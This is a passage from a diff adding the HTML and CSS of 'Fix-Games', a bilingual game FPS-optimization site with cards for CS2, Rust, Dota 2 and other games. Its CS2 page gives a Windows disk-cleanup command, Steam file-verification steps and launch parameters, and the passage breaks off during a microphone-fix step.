@@ -1,0 +1,2207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fix-Games | Game Optimization for FPS Boost</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #6a11cb;
+            --secondary: #2575fc;
+            --accent: #00ff9d;
+            --dark: #121212;
+            --darker: #0a0a0a;
+            --light: #f0f0f0;
+            --gray: #2a2a2a;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Exo 2', sans-serif;
+            background-color: var(--darker);
+            color: var(--light);
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+
+        .animated-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            background: linear-gradient(-45deg, #0a0a0a, #121212, #1a1a2e, #16213e);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(106, 17, 203, 0.3);
+            border-radius: 50%;
+            animation: float 15s infinite linear;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(100vh) translateX(0) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100px) translateX(100px) rotate(360deg); opacity: 0; }
+        }
+
+        .social-bar {
+            background: rgba(10, 10, 10, 0.9);
+            padding: 0.7rem 0;
+            border-bottom: 1px solid rgba(106, 17, 203, 0.3);
+            backdrop-filter: blur(10px);
+        }
+
+        .social-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: flex;
+            justify-content: flex-end;
+            gap: 1.5rem;
+        }
+
+        .social-link {
+            color: var(--accent);
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+            text-decoration: none;
+        }
+
+        .social-link:hover {
+            color: var(--primary);
+            transform: translateY(-2px);
+        }
+
+        .language-switcher {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-right: 1rem;
+        }
+
+        .language-btn {
+            background: transparent;
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            padding: 0.3rem 0.8rem;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+        }
+
+        .language-btn:hover {
+            background: rgba(0, 255, 157, 0.1);
+        }
+
+        .language-btn.active {
+            background: var(--accent);
+            color: var(--dark);
+        }
+
+        header {
+            padding: 2rem 0;
+            text-align: center;
+            background: rgba(10, 10, 10, 0.8);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(106, 17, 203, 0.3);
+            position: relative;
+            z-index: 10;
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 900;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 0.5rem;
+            text-shadow: 0 0 15px rgba(106, 17, 203, 0.5);
+        }
+
+        .tagline {
+            font-size: 1.2rem;
+            color: var(--accent);
+            font-weight: 300;
+            letter-spacing: 1px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .intro {
+            text-align: center;
+            margin-bottom: 3rem;
+            padding: 2rem;
+            background: rgba(18, 18, 18, 0.7);
+            border-radius: 15px;
+            border: 1px solid rgba(106, 17, 203, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(5px);
+        }
+
+        .intro h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            color: var(--accent);
+        }
+
+        .intro p {
+            font-size: 1.1rem;
+            max-width: 800px;
+            margin: 0 auto;
+            color: #ccc;
+        }
+
+        .games-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .game-card {
+            background: rgba(18, 18, 18, 0.8);
+            border-radius: 15px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(106, 17, 203, 0.2);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(5px);
+            position: relative;
+            cursor: pointer;
+            text-decoration: none;
+            color: inherit;
+            display: block;
+        }
+
+        .game-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(106, 17, 203, 0.3);
+            border-color: var(--primary);
+        }
+
+        .game-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+        }
+
+        .game-header {
+            padding: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .game-icon {
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(106, 17, 203, 0.2);
+            border-radius: 50%;
+            font-size: 1.8rem;
+            color: var(--accent);
+        }
+
+        .game-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+
+        .game-content {
+            padding: 0 1.5rem 1.5rem;
+        }
+
+        .game-content ul {
+            list-style: none;
+            margin-bottom: 1.5rem;
+        }
+
+        .game-content li {
+            padding: 0.5rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .game-content li:last-child {
+            border-bottom: none;
+        }
+
+        .game-content i {
+            color: var(--accent);
+            font-size: 0.9rem;
+        }
+
+        .optimize-btn {
+            display: block;
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            font-size: 1rem;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+            text-decoration: none;
+        }
+
+        .optimize-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(106, 17, 203, 0.4);
+        }
+
+        .optimize-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: 0.5s;
+        }
+
+        .optimize-btn:hover::after {
+            left: 100%;
+        }
+
+        /* Game pages */
+        .game-page {
+            display: none;
+        }
+
+        .game-page.active {
+            display: block;
+        }
+
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(106, 17, 203, 0.2);
+            color: var(--accent);
+            border: 1px solid var(--primary);
+            border-radius: 8px;
+            padding: 0.7rem 1.5rem;
+            font-family: 'Exo 2', sans-serif;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 2rem;
+            text-decoration: none;
+        }
+
+        .back-btn:hover {
+            background: rgba(106, 17, 203, 0.4);
+            transform: translateX(-5px);
+        }
+
+        .game-hero {
+            display: flex;
+            align-items: center;
+            gap: 2rem;
+            margin-bottom: 3rem;
+            padding: 2rem;
+            background: rgba(18, 18, 18, 0.7);
+            border-radius: 15px;
+            border: 1px solid rgba(106, 17, 203, 0.2);
+        }
+
+        .game-hero-icon {
+            width: 100px;
+            height: 100px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(106, 17, 203, 0.2);
+            border-radius: 50%;
+            font-size: 3rem;
+            color: var(--accent);
+        }
+
+        .game-hero-content h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .game-hero-content p {
+            color: #ccc;
+            font-size: 1.1rem;
+        }
+
+        .optimization-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .step-card {
+            background: rgba(18, 18, 18, 0.7);
+            border-radius: 15px;
+            padding: 1.5rem;
+            border: 1px solid rgba(106, 17, 203, 0.2);
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .step-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(106, 17, 203, 0.2);
+        }
+
+        .step-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            border-radius: 50%;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            margin-bottom: 1rem;
+        }
+
+        .step-card h3 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.3rem;
+            margin-bottom: 1rem;
+            color: var(--accent);
+        }
+
+        .step-card p {
+            color: #ccc;
+            margin-bottom: 1rem;
+        }
+
+        .step-card ul {
+            list-style: none;
+            margin-bottom: 1rem;
+        }
+
+        .step-card li {
+            padding: 0.3rem 0;
+            color: #ccc;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .step-card li i {
+            color: var(--accent);
+            font-size: 0.8rem;
+        }
+
+        .step-card code {
+            background: rgba(106, 17, 203, 0.2);
+            padding: 0.5rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: var(--accent);
+            display: block;
+            margin: 0.5rem 0;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(106, 17, 203, 0.3);
+        }
+
+        .step-card code:hover {
+            background: rgba(106, 17, 203, 0.3);
+        }
+
+        .copy-indicator {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: var(--accent);
+            color: var(--dark);
+            padding: 0.3rem 0.7rem;
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .copy-indicator.show {
+            opacity: 1;
+        }
+
+        footer {
+            text-align: center;
+            padding: 2rem 0;
+            margin-top: 3rem;
+            background: rgba(10, 10, 10, 0.8);
+            border-top: 1px solid rgba(106, 17, 203, 0.3);
+            backdrop-filter: blur(10px);
+        }
+
+        .footer-text {
+            color: #aaa;
+            font-size: 0.9rem;
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 1rem 1.5rem;
+            background: var(--accent);
+            color: var(--dark);
+            border-radius: 8px;
+            font-weight: 600;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+
+        .notification.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        /* Language switching */
+        .lang-ru {
+            display: none;
+        }
+
+        .lang-en {
+            display: block;
+        }
+
+        body:lang(ru) .lang-ru {
+            display: block;
+        }
+
+        body:lang(ru) .lang-en {
+            display: none;
+        }
+
+        body:lang(en) .lang-ru {
+            display: none;
+        }
+
+        body:lang(en) .lang-en {
+            display: block;
+        }
+
+        @media (max-width: 768px) {
+            .games-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .logo {
+                font-size: 2rem;
+            }
+            
+            .intro h2 {
+                font-size: 1.5rem;
+            }
+            
+            .game-hero {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .social-container {
+                justify-content: space-between;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="animated-bg"></div>
+    <div class="particles" id="particles"></div>
+
+    <div class="social-bar">
+        <div class="social-container">
+            <div class="language-switcher">
+                <button class="language-btn" id="lang-ru">RU</button>
+                <button class="language-btn active" id="lang-en">EN</button>
+            </div>
+            <a href="#" class="social-link">
+                <i class="fab fa-telegram"></i>
+            </a>
+            <a href="#" class="social-link">
+                <i class="fab fa-youtube"></i>
+            </a>
+        </div>
+    </div>
+
+    <header>
+        <div class="container">
+            <h1 class="logo">Fix-Games</h1>
+            <p class="tagline lang-ru">Максимальный FPS для ваших игр</p>
+            <p class="tagline lang-en">Maximum FPS for your games</p>
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- Main page -->
+        <div id="home-page" class="page active">
+            <section class="intro">
+                <h2 class="lang-ru">Оптимизируйте ваши игры для максимальной производительности</h2>
+                <h2 class="lang-en">Optimize your games for maximum performance</h2>
+                <p class="lang-ru">Наш инструмент автоматически настраивает системные параметры и параметры игр для достижения максимального FPS. Выберите игру ниже и получите персонализированные настройки оптимизации.</p>
+                <p class="lang-en">Our tool automatically adjusts system and game settings to achieve maximum FPS. Select a game below and get personalized optimization settings.</p>
+            </section>
+
+            <section class="games-grid">
+                <!-- Counter-Strike 2 Card -->
+                <a href="#" class="game-card" data-game="cs2">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-crosshairs"></i>
+                        </div>
+                        <h3 class="game-title">Counter-Strike 2</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Оптимизация графических настроек</li>
+                            <li><i class="fas fa-check"></i> Настройка параметров запуска</li>
+                            <li><i class="fas fa-check"></i> Решение проблем с Faceit античитом</li>
+                            <li><i class="fas fa-check"></i> Оптимизация сетевых параметров</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Graphics settings optimization</li>
+                            <li><i class="fas fa-check"></i> Launch parameters configuration</li>
+                            <li><i class="fas fa-check"></i> Fixing Faceit anti-cheat issues</li>
+                            <li><i class="fas fa-check"></i> Network parameters optimization</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать CS2</div>
+                        <div class="optimize-btn lang-en">Optimize CS2</div>
+                    </div>
+                </a>
+
+                <!-- Rust Card -->
+                <a href="#" class="game-card" data-game="rust">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-hammer"></i>
+                        </div>
+                        <h3 class="game-title">Rust</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Настройка графики для повышения FPS</li>
+                            <li><i class="fas fa-check"></i> Оптимизация загрузки текстур</li>
+                            <li><i class="fas fa-check"></i> Улучшение отклика игры</li>
+                            <li><i class="fas fa-check"></i> Снижение потребления RAM</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Graphics setup for FPS boost</li>
+                            <li><i class="fas fa-check"></i> Texture loading optimization</li>
+                            <li><i class="fas fa-check"></i> Game responsiveness improvement</li>
+                            <li><i class="fas fa-check"></i> Reduced RAM consumption</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать Rust</div>
+                        <div class="optimize-btn lang-en">Optimize Rust</div>
+                    </div>
+                </a>
+
+                <!-- DayZ Card -->
+                <a href="#" class="game-card" data-game="dayz">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-running"></i>
+                        </div>
+                        <h3 class="game-title">DayZ</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Оптимизация рендеринга объектов</li>
+                            <li><i class="fas fa-check"></i> Настройка расстояния прорисовки</li>
+                            <li><i class="fas fa-check"></i> Улучшение стабильности FPS</li>
+                            <li><i class="fas fa-check"></i> Оптимизация загрузки мира</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Object rendering optimization</li>
+                            <li><i class="fas fa-check"></i> Draw distance configuration</li>
+                            <li><i class="fas fa-check"></i> FPS stability improvement</li>
+                            <li><i class="fas fa-check"></i> World loading optimization</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать DayZ</div>
+                        <div class="optimize-btn lang-en">Optimize DayZ</div>
+                    </div>
+                </a>
+
+                <!-- Dota 2 Card -->
+                <a href="#" class="game-card" data-game="dota2">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-fire"></i>
+                        </div>
+                        <h3 class="game-title">Dota 2</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Настройка графики для соревновательной игры</li>
+                            <li><i class="fas fa-check"></i> Уменьшение задержки ввода</li>
+                            <li><i class="fas fa-check"></i> Оптимизация сетевых параметров</li>
+                            <li><i class="fas fa-check"></i> Улучшение отклика интерфейса</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Competitive graphics setup</li>
+                            <li><i class="fas fa-check"></i> Input lag reduction</li>
+                            <li><i class="fas fa-check"></i> Network parameters optimization</li>
+                            <li><i class="fas fa-check"></i> Interface responsiveness improvement</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать Dota 2</div>
+                        <div class="optimize-btn lang-en">Optimize Dota 2</div>
+                    </div>
+                </a>
+
+                <!-- Tarkov Card -->
+                <a href="#" class="game-card" data-game="tarkov">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-helmet-battle"></i>
+                        </div>
+                        <h3 class="game-title">Escape from Tarkov</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Оптимизация загрузки текстур</li>
+                            <li><i class="fas fa-check"></i> Настройка параметров памяти</li>
+                            <li><i class="fas fa-check"></i> Улучшение стабильности FPS</li>
+                            <li><i class="fas fa-check"></i> Снижение задержки рендеринга</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Texture loading optimization</li>
+                            <li><i class="fas fa-check"></i> Memory parameters configuration</li>
+                            <li><i class="fas fa-check"></i> FPS stability improvement</li>
+                            <li><i class="fas fa-check"></i> Rendering latency reduction</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать Tarkov</div>
+                        <div class="optimize-btn lang-en">Optimize Tarkov</div>
+                    </div>
+                </a>
+
+                <!-- PUBG Card -->
+                <a href="#" class="game-card" data-game="pubg">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-parachute-box"></i>
+                        </div>
+                        <h3 class="game-title">PUBG</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Настройка графики для соревновательной игры</li>
+                            <li><i class="fas fa-check"></i> Уменьшение задержки ввода</li>
+                            <li><i class="fas fa-check"></i> Оптимизация сетевых параметров</li>
+                            <li><i class="fas fa-check"></i> Улучшение отклика игры</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Competitive graphics setup</li>
+                            <li><i class="fas fa-check"></i> Input lag reduction</li>
+                            <li><i class="fas fa-check"></i> Network parameters optimization</li>
+                            <li><i class="fas fa-check"></i> Game responsiveness improvement</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать PUBG</div>
+                        <div class="optimize-btn lang-en">Optimize PUBG</div>
+                    </div>
+                </a>
+
+                <!-- Warface Card -->
+                <a href="#" class="game-card" data-game="warface">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <h3 class="game-title">Warface</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Оптимизация графических настроек</li>
+                            <li><i class="fas fa-check"></i> Настройка параметров запуска</li>
+                            <li><i class="fas fa-check"></i> Улучшение стабильности FPS</li>
+                            <li><i class="fas fa-check"></i> Снижение потребления RAM</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Graphics settings optimization</li>
+                            <li><i class="fas fa-check"></i> Launch parameters configuration</li>
+                            <li><i class="fas fa-check"></i> FPS stability improvement</li>
+                            <li><i class="fas fa-check"></i> Reduced RAM consumption</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать Warface</div>
+                        <div class="optimize-btn lang-en">Optimize Warface</div>
+                    </div>
+                </a>
+
+                <!-- Valorant Card -->
+                <a href="#" class="game-card" data-game="valorant">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-bullseye"></i>
+                        </div>
+                        <h3 class="game-title">Valorant</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Настройка графики для соревновательной игры</li>
+                            <li><i class="fas fa-check"></i> Уменьшение задержки ввода</li>
+                            <li><i class="fas fa-check"></i> Оптимизация сетевых параметров</li>
+                            <li><i class="fas fa-check"></i> Улучшение отклика игры</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Competitive graphics setup</li>
+                            <li><i class="fas fa-check"></i> Input lag reduction</li>
+                            <li><i class="fas fa-check"></i> Network parameters optimization</li>
+                            <li><i class="fas fa-check"></i> Game responsiveness improvement</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать Valorant</div>
+                        <div class="optimize-btn lang-en">Optimize Valorant</div>
+                    </div>
+                </a>
+
+                <!-- Fortnite Card -->
+                <a href="#" class="game-card" data-game="fortnite">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-fort-awesome"></i>
+                        </div>
+                        <h3 class="game-title">Fortnite</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Настройка графики для соревновательной игры</li>
+                            <li><i class="fas fa-check"></i> Уменьшение задержки ввода</li>
+                            <li><i class="fas fa-check"></i> Оптимизация сетевых параметров</li>
+                            <li><i class="fas fa-check"></i> Улучшение отклика игры</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Competitive graphics setup</li>
+                            <li><i class="fas fa-check"></i> Input lag reduction</li>
+                            <li><i class="fas fa-check"></i> Network parameters optimization</li>
+                            <li><i class="fas fa-check"></i> Game responsiveness improvement</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать Fortnite</div>
+                        <div class="optimize-btn lang-en">Optimize Fortnite</div>
+                    </div>
+                </a>
+
+                <!-- Minecraft Card -->
+                <a href="#" class="game-card" data-game="minecraft">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-cube"></i>
+                        </div>
+                        <h3 class="game-title">Minecraft</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Оптимизация Java параметров</li>
+                            <li><i class="fas fa-check"></i> Настройка видеопамяти</li>
+                            <li><i class="fas fa-check"></i> Улучшение рендеринга чанков</li>
+                            <li><i class="fas fa-check"></i> Оптимизация модов и шейдеров</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Java parameters optimization</li>
+                            <li><i class="fas fa-check"></i> Video memory configuration</li>
+                            <li><i class="fas fa-check"></i> Chunk rendering improvement</li>
+                            <li><i class="fas fa-check"></i> Mods and shaders optimization</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать Minecraft</div>
+                        <div class="optimize-btn lang-en">Optimize Minecraft</div>
+                    </div>
+                </a>
+
+                <!-- Apex Legends Card -->
+                <a href="#" class="game-card" data-game="apex">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-running"></i>
+                        </div>
+                        <h3 class="game-title">Apex Legends</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Настройка графики для соревновательной игры</li>
+                            <li><i class="fas fa-check"></i> Уменьшение задержки ввода</li>
+                            <li><i class="fas fa-check"></i> Оптимизация сетевых параметров</li>
+                            <li><i class="fas fa-check"></i> Улучшение отклика игры</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Competitive graphics setup</li>
+                            <li><i class="fas fa-check"></i> Input lag reduction</li>
+                            <li><i class="fas fa-check"></i> Network parameters optimization</li>
+                            <li><i class="fas fa-check"></i> Game responsiveness improvement</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать Apex</div>
+                        <div class="optimize-btn lang-en">Optimize Apex</div>
+                    </div>
+                </a>
+
+                <!-- Call of Duty Card -->
+                <a href="#" class="game-card" data-game="cod">
+                    <div class="game-header">
+                        <div class="game-icon">
+                            <i class="fas fa-gamepad"></i>
+                        </div>
+                        <h3 class="game-title">Call of Duty</h3>
+                    </div>
+                    <div class="game-content">
+                        <ul class="lang-ru">
+                            <li><i class="fas fa-check"></i> Настройка графики для соревновательной игры</li>
+                            <li><i class="fas fa-check"></i> Уменьшение задержки ввода</li>
+                            <li><i class="fas fa-check"></i> Оптимизация сетевых параметров</li>
+                            <li><i class="fas fa-check"></i> Улучшение отклика игры</li>
+                        </ul>
+                        <ul class="lang-en">
+                            <li><i class="fas fa-check"></i> Competitive graphics setup</li>
+                            <li><i class="fas fa-check"></i> Input lag reduction</li>
+                            <li><i class="fas fa-check"></i> Network parameters optimization</li>
+                            <li><i class="fas fa-check"></i> Game responsiveness improvement</li>
+                        </ul>
+                        <div class="optimize-btn lang-ru">Оптимизировать COD</div>
+                        <div class="optimize-btn lang-en">Optimize COD</div>
+                    </div>
+                </a>
+            </section>
+        </div>
+
+        <!-- Counter-Strike 2 Page -->
+        <div id="cs2-page" class="game-page">
+            <button class="back-btn" id="back-btn"><i class="fas fa-arrow-left"></i> <span class="lang-ru">Назад к играм</span><span class="lang-en">Back to games</span></button>
+            
+            <div class="game-hero">
+                <div class="game-hero-icon">
+                    <i class="fas fa-crosshairs"></i>
+                </div>
+                <div class="game-hero-content">
+                    <h2>Counter-Strike 2</h2>
+                    <p class="lang-ru">Оптимизация настроек для максимального FPS и решения проблем с Faceit античитом</p>
+                    <p class="lang-en">Settings optimization for maximum FPS and fixing Faceit anti-cheat issues</p>
+                </div>
+            </div>
+
+            <div class="optimization-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3 class="lang-ru">Очистка системного кэша</h3>
+                    <h3 class="lang-en">System cache cleanup</h3>
+                    <p class="lang-ru">Очистка временных файлов и кэша для освобождения ресурсов системы:</p>
+                    <p class="lang-en">Cleaning temporary files and cache to free up system resources:</p>
+                    <code class="copy-command">cleanmgr /sageset:1 & cleanmgr /sagerun:1</code>
+                    <p class="lang-ru">Нажмите Win+R, пропишите cmd и в открывшуюся командную строку вставьте команду для очистки кэша.</p>
+                    <p class="lang-en">Press Win+R, type cmd and paste the command into the command line to clear the cache.</p>
+                    <div class="copy-indicator lang-ru">Скопировано!</div>
+                    <div class="copy-indicator lang-en">Copied!</div>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3 class="lang-ru">Решение ошибки "VAC was unable to verify"</h3>
+                    <h3 class="lang-en">Fixing "VAC was unable to verify" error</h3>
+                    <p class="lang-ru">Популярная ошибка античита Valve:</p>
+                    <p class="lang-en">Common Valve anti-cheat error:</p>
+                    <ul>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Откройте Steam → Библиотека → CS2</span><span class="lang-en">Open Steam → Library → CS2</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">ПКМ → Свойства → Установленные файлы</span><span class="lang-en">Right-click → Properties → Installed Files</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Нажмите "Проверить целостность файлов"</span><span class="lang-en">Click "Verify integrity of game files"</span></li>
+                        <li><i class="fas fa-exclamation-triangle"></i> <span class="lang-ru">Перезагрузите компьютер</span><span class="lang-en">Restart your computer</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3 class="lang-ru">Настройка параметров запуска</h3>
+                    <h3 class="lang-en">Launch parameters setup</h3>
+                    <p class="lang-ru">Добавьте эти параметры в свойствах игры в Steam:</p>
+                    <p class="lang-en">Add these parameters in game properties in Steam:</p>
+                    <code>-novid -high -threads 4 +fps_max 0 -nojoy -fullscreen +cl_forcepreload 1</code>
+                    <ul>
+                        <li><i class="fas fa-cog"></i> <code>-novid</code> - <span class="lang-ru">отключает вступительное видео</span><span class="lang-en">disables intro video</span></li>
+                        <li><i class="fas fa-cog"></i> <code>-high</code> - <span class="lang-ru">высокий приоритет процесса</span><span class="lang-en">high process priority</span></li>
+                        <li><i class="fas fa-cog"></i> <code>-threads 4</code> - <span class="lang-ru">количество потоков CPU</span><span class="lang-en">number of CPU threads</span></li>
+                        <li><i class="fas fa-cog"></i> <code>+fps_max 0</code> - <span class="lang-ru">снимает ограничение FPS</span><span class="lang-en">removes FPS limit</span></li>
+                    </ul>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3 class="lang-ru">Решение проблемы с микрофоном</h3>
+                    <h3 class="lang-en">Microphone issue fix</h3>
+                    <p class="lang-ru">Если микрофон не работает в голосовом чате:</p>
+                    <p class="lang-en">If microphone doesn't work in voice chat:</p>
+                    <ul>
